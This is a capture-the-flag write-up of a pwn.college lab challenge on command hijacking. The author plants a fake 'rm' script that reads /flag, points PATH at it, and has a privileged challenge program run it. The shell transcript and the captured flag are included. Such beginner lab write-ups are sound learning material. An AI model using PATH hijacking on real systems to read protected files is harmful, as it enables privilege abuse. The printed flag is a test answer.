# Hijacking Commands
### The challenge asks us to hijack commands


## My Solve
**Flag:** pwn.college{87xFAs_GXDgyvPqpPsb6seO4gNq.QX3cjM1wSO1EzNzEzW}
Used cd to change cwd to the directory i created then made my own rm 
by making it run the flag which i did by using echo '/run/dojo/bin/cat /flag' >> rm
then put echo 'exit 0' >> rm so that theres no unexpected file end then made it 
so that it is executable by anyone using chmod a+x then set PATH to myscripts directory
which i created in the previous challenges then ran /challenge/run to get the flag

```
hacker@path~hijacking-commands:~$ cd ~/myscripts
hacker@path~hijacking-commands:~/myscripts$ echo '#!/bin/bash' > rm
hacker@path~hijacking-commands:~/myscripts$ echo '/run/dojo/bin/cat /flag' >> rm
hacker@path~hijacking-commands:~/myscripts$ echo 'exit 0' >> rm
hacker@path~hijacking-commands:~/myscripts$ chmod a+x  /home/hacker/myscripts/rm
hacker@path~hijacking-commands:~/myscripts$ cd
hacker@path~hijacking-commands:~$ PATH=/home/hacker/myscripts
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
pwn.college{87xFAs_GXDgyvPqpPsb6seO4gNq.QX3cjM1wSO1EzNzEzW}
```

## What I Learned
I learned how to hijack commands

## References
None